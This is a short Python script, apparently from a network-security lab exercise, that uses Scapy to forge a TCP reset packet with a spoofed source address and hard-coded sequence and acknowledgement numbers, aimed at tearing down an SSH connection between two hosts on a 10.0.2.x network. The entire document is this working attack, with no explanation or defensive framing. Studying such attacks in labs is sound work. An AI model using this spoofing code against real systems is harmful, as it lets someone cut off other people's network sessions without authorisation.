#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=22, dport=44396, flags="R", seq=1795007540, ack=  2362983126)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
